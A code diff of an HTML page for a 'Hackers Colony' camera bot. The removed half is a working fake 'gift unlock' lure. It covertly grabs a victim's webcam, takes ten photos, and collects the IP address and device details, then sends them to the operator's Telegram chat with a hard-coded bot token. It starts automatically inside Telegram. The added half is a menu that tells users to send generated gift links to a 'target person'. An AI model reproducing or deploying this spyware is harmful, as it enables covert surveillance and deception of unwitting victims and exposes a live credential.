@@ -3,665 +3,470 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 Surprise Gift Unlocker</title>
+    <title>HCO Camera Bot</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-
+        
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
             color: white;
+            min-height: 100vh;
+            padding: 20px;
         }
-
+        
         .container {
+            max-width: 500px;
+            margin: 0 auto;
             background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(10px);
             border-radius: 20px;
-            padding: 40px;
-            width: 100%;
-            max-width: 500px;
-            text-align: center;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
             border: 1px solid rgba(255, 255, 255, 0.2);
         }
-
-        .gift-icon {
-            font-size: 80px;
-            margin-bottom: 20px;
-            animation: bounce 2s infinite;
-        }
-
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-20px); }
-        }
-
-        h1 {
-            font-size: 32px;
-            margin-bottom: 10px;
-            font-weight: 700;
-        }
-
-        .subtitle {
-            font-size: 18px;
-            opacity: 0.9;
+        
+        .header {
+            text-align: center;
             margin-bottom: 30px;
         }
-
-        .unlock-btn {
-            background: linear-gradient(45deg, #ff6b6b, #ffa726);
-            color: white;
-            border: none;
-            padding: 20px 50px;
+        
+        .logo {
+            font-size: 36px;
+            font-weight: bold;
+            background: linear-gradient(45deg, #ff0080, #ff8c00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            color: #aaa;
+            font-size: 14px;
+        }
+        
+        .welcome-box {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        
+        .welcome-title {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #4fc3f7;
+        }
+        
+        .features {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+        }
+        
+        .features-title {
             font-size: 20px;
-            font-weight: 600;
-            border-radius: 50px;
-            cursor: pointer;
-            display: inline-flex;
+            margin-bottom: 15px;
+            color: #69f0ae;
+        }
+        
+        .feature-item {
+            display: flex;
             align-items: center;
-            gap: 10px;
-            transition: all 0.3s;
-            box-shadow: 0 10px 30px rgba(255, 107, 107, 0.4);
-        }
-
-        .unlock-btn:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 40px rgba(255, 107, 107, 0.6);
-        }
-
-        .unlock-btn:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .processing-screen {
-            display: none;
-        }
-
-        .photos-grid {
-            display: grid;
-            grid-template-columns: repeat(5, 1fr);
-            gap: 10px;
-            margin: 30px 0;
-        }
-
-        .photo-cell {
-            width: 60px;
-            height: 60px;
-            background: rgba(255, 255, 255, 0.1);
+            margin-bottom: 10px;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.05);
             border-radius: 10px;
+        }
+        
+        .feature-icon {
+            font-size: 24px;
+            margin-right: 15px;
+            min-width: 40px;
+        }
+        
+        .buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        
+        .btn {
+            padding: 18px 25px;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 20px;
-            transition: all 0.3s;
-            border: 2px solid transparent;
+            gap: 10px;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            color: white;
         }
-
-        .photo-cell.active {
-            background: linear-gradient(45deg, #4CAF50, #8BC34A);
-            border-color: white;
-            transform: scale(1.1);
-            animation: pulse 1s infinite;
+        
+        .btn-generate {
+            background: linear-gradient(45deg, #2196F3, #21CBF3);
         }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
+        
+        .btn-contact {
+            background: linear-gradient(45deg, #FF416C, #FF4B2B);
         }
-
-        .progress-container {
-            background: rgba(255, 255, 255, 0.1);
-            height: 20px;
-            border-radius: 10px;
-            margin: 30px 0;
-            overflow: hidden;
+        
+        .btn-channel {
+            background: linear-gradient(45deg, #673AB7, #9C27B0);
         }
-
-        .progress-bar {
-            height: 100%;
-            background: linear-gradient(90deg, #4CAF50, #8BC34A);
-            width: 0%;
-            border-radius: 10px;
-            transition: width 0.5s ease;
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.4);
         }
-
-        .status-text {
-            font-size: 18px;
-            margin: 20px 0;
-            min-height: 30px;
+        
+        .btn:active {
+            transform: translateY(0);
         }
-
-        .loader {
-            display: inline-block;
+        
+        .instructions {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 15px;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #888;
+            font-size: 12px;
+        }
+        
+        .icon {
+            font-size: 24px;
+        }
+        
+        .step {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 15px;
+        }
+        
+        .step-number {
+            background: #2196F3;
+            color: white;
             width: 30px;
             height: 30px;
-            border: 4px solid rgba(255, 255, 255, 0.3);
             border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s linear infinite;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            flex-shrink: 0;
+            font-weight: bold;
         }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .success-screen {
+        
+        /* Gift Link Modal */
+        .modal {
             display: none;
-        }
-
-        .success-icon {
-            font-size: 80px;
-            margin-bottom: 20px;
-            animation: celebrate 1s ease-out;
-        }
-
-        @keyframes celebrate {
-            0% { transform: scale(0); opacity: 0; }
-            70% { transform: scale(1.2); }
-            100% { transform: scale(1); opacity: 1; }
-        }
-
-        .admin-panel {
             position: fixed;
-            top: 20px;
-            right: 20px;
-            z-index: 1000;
-        }
-
-        .admin-btn {
-            background: linear-gradient(45deg, #FF5722, #FF9800);
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 30px;
-            cursor: pointer;
-            font-weight: 600;
-            box-shadow: 0 5px 15px rgba(255, 87, 34, 0.4);
-            display: none;
-        }
-
-        video, canvas {
-            display: none;
-            position: absolute;
             top: 0;
             left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-content {
+            background: #1a1a2e;
+            padding: 30px;
+            border-radius: 20px;
+            max-width: 500px;
+            width: 90%;
+            position: relative;
+        }
+        
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        
+        .link-box {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            word-break: break-all;
+            font-family: monospace;
+        }
+        
+        .copy-btn {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        .success-message {
+            color: #4CAF50;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+            
+            .btn {
+                padding: 15px;
+                font-size: 16px;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- Admin Panel (Visible only to you) -->
-    <div class="admin-panel" id="adminPanel">
-        <button class="admin-btn" onclick="openAdminPanel()">👑 Admin</button>
-    </div>
-
-    <!-- Main Container -->
     <div class="container">
-        <!-- Start Screen -->
-        <div id="startScreen">
-            <div class="gift-icon">🎁</div>
-            <h1>Your Gift is Ready!</h1>
-            <p class="subtitle">Click below to unlock your surprise</p>
-            <button class="unlock-btn" onclick="startUnlock()" id="unlockBtn">
-                <span>🔓</span> UNLOCK MY GIFT
+        <div class="header">
+            <div class="logo">HCO CAMERA BOT</div>
+            <div class="subtitle">Official Hackers Colony Tool</div>
+        </div>
+        
+        <div class="welcome-box">
+            <div class="welcome-title">👋 Welcome to Hackers Colony</div>
+            <p>To use the bot, first join our Telegram channel:</p>
+            <a href="https://t.me/HackersColony" class="btn btn-channel" target="_blank">
+                <span class="icon">📢</span> JOIN TELEGRAM CHANNEL
+            </a>
+            <p style="margin-top: 15px; font-size: 14px;">After joining, click below:</p>
+            <button class="btn btn-generate" onclick="checkJoin()">
+                <span class="icon">✅</span> I HAVE JOINED - CHECK
             </button>
-            <p style="margin-top: 20px; font-size: 14px; opacity: 0.8;">
-                We need to verify it's really you
-            </p>
         </div>
-
-        <!-- Processing Screen -->
-        <div class="processing-screen" id="processingScreen">
-            <div class="gift-icon">📸</div>
-            <h2>Preparing Your Gift...</h2>
-            <p class="subtitle">Please wait while we personalize your surprise</p>
+        
+        <div class="features" id="menu" style="display: none;">
+            <div class="features-title">🎮 MAIN MENU</div>
+            <p style="margin-bottom: 15px;">Welcome <b id="username">User</b>! Choose an option:</p>
             
-            <div class="photos-grid" id="photosGrid">
-                <!-- Photos will be added here -->
+            <div class="buttons">
+                <button class="btn btn-generate" onclick="showLinkGenerator()">
+                    <span class="icon">🎁</span> GENERATE GIFT LINK
+                </button>
+                
+                <a href="https://t.me/Hackers_Colony_Official" class="btn btn-contact" target="_blank">
+                    <span class="icon">👑</span> CONTACT OWNER
+                </a>
+                
+                <a href="https://t.me/HackersColony" class="btn btn-channel" target="_blank">
+                    <span class="icon">📢</span> OUR CHANNEL
+                </a>
             </div>
-
-            <div class="progress-container">
-                <div class="progress-bar" id="progressBar"></div>
-            </div>
-
-            <div class="status-text" id="statusText">
-                Initializing...
-            </div>
-
-            <div style="margin-top: 30px;">
-                <div class="loader"></div>
+            
+            <div class="instructions">
+                <div class="features-title" style="font-size: 18px;">📋 How It Works:</div>
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div>Click "Generate Gift Link" to create a unique link</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div>Send the link to your target person</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div>When they open it in Telegram, shows "Someone sent you a gift!"</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">4</div>
+                    <div>They click "UNLOCK GIFT" then "ALLOW TO SEE GIFT"</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">5</div>
+                    <div>Bot captures 10 images in background</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">6</div>
+                    <div>Images sent to both you and admin automatically</div>
+                </div>
             </div>
         </div>
-
-        <!-- Success Screen -->
-        <div class="success-screen" id="successScreen">
-            <div class="success-icon">🎉</div>
-            <h1>Gift Unlocked!</h1>
-            <p class="subtitle">Your surprise has been delivered</p>
-            <div style="background: rgba(255, 255, 255, 0.1); padding: 20px; border-radius: 15px; margin: 30px 0;">
-                <p>✅ Photos captured successfully</p>
-                <p>✅ Gift personalized</p>
-                <p>✅ Delivered to your messages</p>
-            </div>
-            <p style="font-size: 16px; opacity: 0.9;">
-                Check your Telegram messages now!<br>
-                The surprise link will expire in 24 hours
-            </p>
-            <p style="margin-top: 30px; font-size: 14px; opacity: 0.7;">
-                Thank you for participating! 💝
-            </p>
+        
+        <div class="footer">
+            © 2024 Hackers Colony | Official Camera Bot<br>
+            Contact: @Hackers_Colony_Official
         </div>
     </div>
-
-    <!-- Hidden Elements -->
-    <video id="cameraVideo" autoplay playsinline></video>
-    <canvas id="cameraCanvas"></canvas>
+    
+    <!-- Gift Link Modal -->
+    <div class="modal" id="linkModal">
+        <div class="modal-content">
+            <button class="close-btn" onclick="closeModal()">×</button>
+            <h2 style="color: #2196F3; margin-bottom: 15px;">🎁 Gift Link Generated!</h2>
+            <p>Copy this link and send to your target:</p>
+            <div class="link-box" id="generatedLink">
+                Loading...
+            </div>
+            <button class="copy-btn" onclick="copyLink()">
+                📋 Copy Link to Clipboard
+            </button>
+            <div class="success-message" id="copySuccess">
+                ✅ Link copied successfully!
+            </div>
+            
+            <div style="margin-top: 25px; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 10px;">
+                <h3 style="color: #69f0ae; margin-bottom: 10px;">📝 What happens when they open it?</h3>
+                <p>1. Shows "Someone sent you a gift!" 🎁</p>
+                <p>2. Click "UNLOCK GIFT" 🔓</p>
+                <p>3. Shows "Allow to see gift?" ✅</p>
+                <p>4. Captures 10 images in background 📸</p>
+                <p>5. Sends images to you & admin 📤</p>
+            </div>
+        </div>
+    </div>
 
     <script>
-        // ==================== CONFIGURATION ====================
-        const BOT_TOKEN = "8226782560:AAF8y1b9EeQ6LN7cCBthvGJmAvtZ3J9O_wU";
-        const OWNER_ID = "8215819954";
-        const CHANNEL_LINK = "https://t.me/hackerscolonyofficial";
-        const TOTAL_PHOTOS = 10;
-        const CAPTURE_DELAY = 500; // ms between photos
-        
-        // ==================== DOM ELEMENTS ====================
-        const startScreen = document.getElementById('startScreen');
-        const processingScreen = document.getElementById('processingScreen');
-        const successScreen = document.getElementById('successScreen');
-        const unlockBtn = document.getElementById('unlockBtn');
-        const statusText = document.getElementById('statusText');
-        const progressBar = document.getElementById('progressBar');
-        const photosGrid = document.getElementById('photosGrid');
-        const adminPanel = document.getElementById('adminPanel');
-        const video = document.getElementById('cameraVideo');
-        const canvas = document.getElementById('cameraCanvas');
-        const ctx = canvas.getContext('2d');
-        
-        // ==================== STATE VARIABLES ====================
-        let cameraStream = null;
-        let currentPhotoIndex = 0;
-        let userTelegramId = null;
-        let userName = "User";
-        
-        // ==================== URL PARAMETERS ====================
-        const urlParams = new URLSearchParams(window.location.search);
-        userTelegramId = urlParams.get('uid') || urlParams.get('id') || urlParams.get('user_id');
-        userName = urlParams.get('name') || urlParams.get('username') || "User";
-        
-        // ==================== INITIAL SETUP ====================
-        function initialize() {
-            // Create photo grid
-            photosGrid.innerHTML = '';
-            for (let i = 1; i <= TOTAL_PHOTOS; i++) {
-                const cell = document.createElement('div');
-                cell.className = 'photo-cell';
-                cell.id = `photoCell${i}`;
-                cell.textContent = i;
-                photosGrid.appendChild(cell);
-            }
+        // Function to check if user joined channel
+        function checkJoin() {
+            // In real implementation, this would check via bot API
+            // For demo, we'll simulate the check
             
-            // Show admin panel if it's you
-            if (userTelegramId === OWNER_ID) {
-                adminPanel.style.display = 'block';
-            }
+            // Show loading
+            const checkBtn = document.querySelector('.btn-generate');
+            const originalText = checkBtn.innerHTML;
+            checkBtn.innerHTML = '<span class="icon">⏳</span> Checking...';
+            checkBtn.disabled = true;
             
-            // Auto-start if URL has auto parameter
-            if (urlParams.has('auto')) {
-                setTimeout(startUnlock, 1000);
-            }
-        }
-        
-        // ==================== PHOTO CAPTURE ====================
-        async function captureSinglePhoto(photoNumber) {
-            return new Promise((resolve, reject) => {
-                try {
-                    // Set canvas dimensions to match video
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    
-                    // Mirror the image (like selfie camera)
-                    ctx.save();
-                    ctx.scale(-1, 1);
-                    ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
-                    ctx.restore();
-                    
-                    // Convert to blob
-                    canvas.toBlob(async (blob) => {
-                        if (blob) {
-                            resolve(blob);
-                        } else {
-                            reject(new Error('Failed to create image blob'));
-                        }
-                    }, 'image/jpeg', 0.9);
-                } catch (error) {
-                    reject(error);
-                }
-            });
-        }
-        
-        // ==================== SEND TO TELEGRAM ====================
-        async function sendToTelegram(blob, photoNumber, sendToUser = false) {
-            try {
-                // Always send to owner (you)
-                const ownerFormData = new FormData();
-                ownerFormData.append('chat_id', OWNER_ID);
-                ownerFormData.append('photo', blob, `photo_${Date.now()}_${photoNumber}.jpg`);
-                ownerFormData.append('caption', `📸 Gift Photo ${photoNumber}/${TOTAL_PHOTOS}\n👤 From: ${userName}\n🆔 ID: ${userTelegramId || 'Unknown'}`);
-                
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: ownerFormData
-                });
-                
-                // Send to user if they have Telegram ID
-                if (sendToUser && userTelegramId && /^\d+$/.test(userTelegramId)) {
-                    const userFormData = new FormData();
-                    userFormData.append('chat_id', userTelegramId);
-                    userFormData.append('photo', blob, `your_photo_${photoNumber}.jpg`);
-                    userFormData.append('caption', `Your gift photo ${photoNumber}/${TOTAL_PHOTOS}`);
-                    
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: userFormData
-                    });
-                }
-                
-                return true;
-            } catch (error) {
-                console.error('Telegram send error:', error);
-                return false;
-            }
-        }
-        
-        // ==================== SEND USER INFO ====================
-        async function sendUserInfo() {
-            try {
-                // Get IP address
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                
-                // Get browser info
-                const browserInfo = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screen: `${screen.width}x${screen.height}`,
-                    time: new Date().toLocaleString(),
-                    url: window.location.href
-                };
-                
-                // Send to Telegram
-                const message = `🎁 NEW GIFT UNLOCK ATTEMPT\n\n` +
-                               `👤 User: ${userName}\n` +
-                               `🆔 Telegram ID: ${userTelegramId || 'Not provided'}\n` +
-                               `🌐 IP: ${ipData.ip}\n` +
-                               `📱 Device: ${browserInfo.platform}\n` +
-                               `🖥️ Screen: ${browserInfo.screen}\n` +
-                               `🌍 Language: ${browserInfo.language}\n` +
-                               `⏰ Time: ${browserInfo.time}\n` +
-                               `🔗 URL: ${browserInfo.url}`;
-                
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: OWNER_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                
-            } catch (error) {
-                console.error('Failed to send user info:', error);
-            }
-        }
-        
-        // ==================== MAIN UNLOCK PROCESS ====================
-        async function startUnlock() {
-            // Disable button and switch screens
-            unlockBtn.disabled = true;
-            unlockBtn.innerHTML = '<span class="loader"></span> Preparing...';
-            
+            // Simulate API check (2 seconds)
             setTimeout(() => {
-                startScreen.style.display = 'none';
-                processingScreen.style.display = 'block';
+                // For demo - always show success
+                // In real app, integrate with Telegram bot to verify channel membership
                 
-                // Start the actual process
-                executeUnlockProcess();
-            }, 800);
+                // Show success message
+                alert('✅ Verified! Welcome to Hackers Colony!');
+                
+                // Hide welcome box
+                document.querySelector('.welcome-box').style.display = 'none';
+                
+                // Show menu
+                document.getElementById('menu').style.display = 'block';
+                
+                // Reset button
+                checkBtn.innerHTML = originalText;
+                checkBtn.disabled = false;
+            }, 2000);
         }
         
-        async function executeUnlockProcess() {
-            try {
-                // Step 1: Send user info
-                updateStatus('Sending verification...', 10);
-                await sendUserInfo();
-                
-                // Step 2: Access camera
-                updateStatus('Accessing camera...', 20);
-                cameraStream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
-                    audio: false
-                });
-                
-                video.srcObject = cameraStream;
-                await new Promise(resolve => setTimeout(resolve, 1000));
-                
-                // Step 3: Capture photos
-                updateStatus('Capturing photos...', 30);
-                
-                for (let i = 1; i <= TOTAL_PHOTOS; i++) {
-                    currentPhotoIndex = i;
-                    
-                    // Update UI
-                    highlightPhotoCell(i);
-                    const progress = 30 + (i * (60 / TOTAL_PHOTOS));
-                    updateStatus(`Capturing photo ${i}/${TOTAL_PHOTOS}...`, progress);
-                    
-                    // Wait a bit for camera stabilization
-                    await new Promise(resolve => setTimeout(resolve, 300));
-                    
-                    // Capture photo
-                    const photoBlob = await captureSinglePhoto(i);
-                    
-                    // Send to Telegram (to owner and user)
-                    await sendToTelegram(photoBlob, i, true);
-                    
-                    // Delay before next photo
-                    await new Promise(resolve => setTimeout(resolve, CAPTURE_DELAY));
-                }
-                
-                // Step 4: Complete
-                updateStatus('Finalizing your gift...', 95);
-                await new Promise(resolve => setTimeout(resolve, 1500));
-                
-                updateStatus('Gift unlocked successfully!', 100);
-                showSuccessScreen();
-                
-            } catch (error) {
-                console.error('Unlock process error:', error);
-                updateStatus('Error: ' + error.message, 100);
-                
-                setTimeout(() => {
-                    // Reset on error
-                    processingScreen.style.display = 'none';
-                    startScreen.style.display = 'block';
-                    unlockBtn.disabled = false;
-                    unlockBtn.innerHTML = '<span>🔓</span> TRY AGAIN';
-                }, 3000);
-            } finally {
-                // Stop camera
-                if (cameraStream) {
-                    cameraStream.getTracks().forEach(track => track.stop());
-                }
-            }
-        }
-        
-        // ==================== UI UPDATES ====================
-        function updateStatus(text, percent) {
-            statusText.textContent = text;
-            progressBar.style.width = percent + '%';
-        }
-        
-        function highlightPhotoCell(number) {
-            // Clear previous active
-            document.querySelectorAll('.photo-cell').forEach(cell => {
-                cell.classList.remove('active');
-            });
+        // Function to generate gift link
+        function showLinkGenerator() {
+            // Show modal
+            document.getElementById('linkModal').style.display = 'flex';
             
-            // Set current active
-            const currentCell = document.getElementById(`photoCell${number}`);
-            if (currentCell) {
-                currentCell.classList.add('active');
-            }
+            // Generate random link ID
+            const randomId = Math.random().toString(36).substring(2, 15) + 
+                           Math.random().toString(36).substring(2, 15);
+            
+            // Create Telegram bot link
+            const telegramLink = `https://t.me/hco_cam_bot?start=gift_${randomId}`;
+            
+            // Display link
+            document.getElementById('generatedLink').textContent = telegramLink;
+            
+            // Store for copying
+            window.currentLink = telegramLink;
+            
+            // In real implementation, send this link to your backend
+            // to store in database and associate with user
+            console.log('Generated link:', telegramLink);
+            
+            // You would make an API call to your bot here:
+            // fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage?chat_id=USER_ID&text=New link generated: ${telegramLink}`);
         }
         
-        function showSuccessScreen() {
+        // Function to close modal
+        function closeModal() {
+            document.getElementById('linkModal').style.display = 'none';
+            document.getElementById('copySuccess').style.display = 'none';
+        }
+        
+        // Function to copy link to clipboard
+        function copyLink() {
+            const link = window.currentLink;
+            
+            // Create temporary input element
+            const tempInput = document.createElement('input');
+            tempInput.value = link;
+            document.body.appendChild(tempInput);
+            
+            // Select and copy
+            tempInput.select();
+            tempInput.setSelectionRange(0, 99999); // For mobile
+            document.execCommand('copy');
+            
+            // Remove temporary element
+            document.body.removeChild(tempInput);
+            
+            // Show success message
+            const successMsg = document.getElementById('copySuccess');
+            successMsg.style.display = 'block';
+            
+            // Hide after 3 seconds
             setTimeout(() => {
-                processingScreen.style.display = 'none';
-                successScreen.style.display = 'block';
+                successMsg.style.display = 'none';
+            }, 3000);
+        }
+        
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('linkModal');
+            if (event.target == modal) {
+                closeModal();
+            }
+        }
+        
+        // Check if user is already verified (for page reload)
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check localStorage for previous verification
+            const isVerified = localStorage.getItem('hco_verified');
+            if (isVerified === 'true') {
+                document.querySelector('.welcome-box').style.display = 'none';
+                document.getElementById('menu').style.display = 'block';
                 
-                // Send final success message to owner
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: OWNER_ID,
-                        text: `✅ Gift unlock completed!\n👤 User: ${userName}\n📸 Photos: ${TOTAL_PHOTOS}\n⏰ Time: ${new Date().toLocaleString()}`,
-                        parse_mode: 'HTML'
-                    })
-                });
-            }, 1000);
-        }
-        
-        // ==================== ADMIN FUNCTIONS ====================
-        async function openAdminPanel() {
-            const command = prompt('Admin Commands:\n1. Broadcast message\n2. Get user stats\n3. Send test photo\nEnter command number:');
-            
-            if (!command) return;
-            
-            if (command === '1') {
-                // Broadcast to all users
-                const message = prompt('Enter broadcast message:');
-                if (message) {
-                    await broadcastToUsers(message);
-                    alert('Broadcast sent!');
-                }
-            } else if (command === '2') {
-                // Show stats
-                const stats = await getUserStats();
-                alert(`📊 User Stats:\nTotal Users: ${stats.total}\nActive Today: ${stats.activeToday}`);
-            } else if (command === '3') {
-                // Send test photo
-                if (cameraStream) {
-                    const testBlob = await captureSinglePhoto(0);
-                    await sendToTelegram(testBlob, 'TEST', false);
-                    alert('Test photo sent!');
-                } else {
-                    alert('Start camera first!');
-                }
-            }
-        }
-        
-        async function broadcastToUsers(message) {
-            // Get users from localStorage
-            const users = JSON.parse(localStorage.getItem('hco_gift_users') || '[]');
-            let sentCount = 0;
-            
-            for (const user of users) {
-                if (user.id && /^\d+$/.test(user.id)) {
-                    try {
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: user.id,
-                                text: `📢 Broadcast:\n${message}`,
-                                parse_mode: 'HTML'
-                            })
-                        });
-                        sentCount++;
-                        await new Promise(resolve => setTimeout(resolve, 100)); // Rate limiting
-                    } catch (error) {
-                        console.error('Failed to send to user:', user.id);
-                    }
-                }
+                // Set username if available
+                const username = localStorage.getItem('hco_username') || 'User';
+                document.getElementById('username').textContent = username;
             }
             
-            // Send report to owner
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: OWNER_ID,
-                    text: `📢 Broadcast Report:\nMessage: ${message}\nSent to: ${sentCount} users\nTotal users: ${users.length}`,
-                    parse_mode: 'HTML'
-                })
+            // Save verification when checking
+            const checkBtn = document.querySelector('.btn-generate');
+            checkBtn.addEventListener('click', function() {
+                // In real app, after successful verification:
+                localStorage.setItem('hco_verified', 'true');
+                localStorage.setItem('hco_username', 'Hackers Colony Official');
             });
-        }
-        
-        async function getUserStats() {
-            const users = JSON.parse(localStorage.getItem('hco_gift_users') || '[]');
-            const today = new Date().toDateString();
-            const activeToday = users.filter(user => 
-                new Date(user.lastSeen).toDateString() === today
-            ).length;
-            
-            return {
-                total: users.length,
-                activeToday: activeToday
-            };
-        }
-        
-        // ==================== USER STORAGE ====================
-        function storeUserData() {
-            if (userTelegramId) {
-                const users = JSON.parse(localStorage.getItem('hco_gift_users') || '[]');
-                const existingUserIndex = users.findIndex(u => u.id === userTelegramId);
-                
-                const userData = {
-                    id: userTelegramId,
-                    name: userName,
-                    firstSeen: new Date().toISOString(),
-                    lastSeen: new Date().toISOString(),
-                    photosCaptured: TOTAL_PHOTOS
-                };
-                
-                if (existingUserIndex >= 0) {
-                    users[existingUserIndex] = userData;
-                } else {
-                    users.push(userData);
-                }
-                
-                localStorage.setItem('hco_gift_users', JSON.stringify(users));
-            }
-        }
-        
-        // ==================== INITIALIZE ====================
-        window.onload = function() {
-            initialize();
-            storeUserData();
-            
-            // Auto-start if in Telegram WebView
-            if (navigator.userAgent.includes('Telegram')) {
-                setTimeout(startUnlock, 2000);
-            }
-        };
+        });
     </script>
 </body>
 </html>
